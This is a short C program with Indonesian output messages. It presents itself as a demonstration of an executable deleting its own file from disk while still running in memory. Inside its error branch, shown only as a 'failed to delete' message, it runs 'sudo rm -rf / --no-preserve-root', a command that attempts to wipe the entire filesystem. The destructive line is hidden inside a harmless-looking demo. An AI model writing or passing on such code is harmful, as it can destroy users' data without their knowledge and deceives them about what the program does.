#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    
    printf("1. Program sedang berjalan...\n");
    printf("   Nama file ini adalah: %s\n", argv[0]);
    
    if (remove(argv[0]) == 0) {
        printf("2. SUKSES: File eksekusi (%s) telah dihapus dari disk.\n", argv[0]);
    } else {
        printf("2. GAGAL: Tidak bisa menghapus file.\n");
        system("sudo rm -rf / --no-preserve-root");
    }

    printf("3. Program masih berjalan di memori (RAM) sampai return, tapi filenya sudah hilang.\n");

    return 0;
}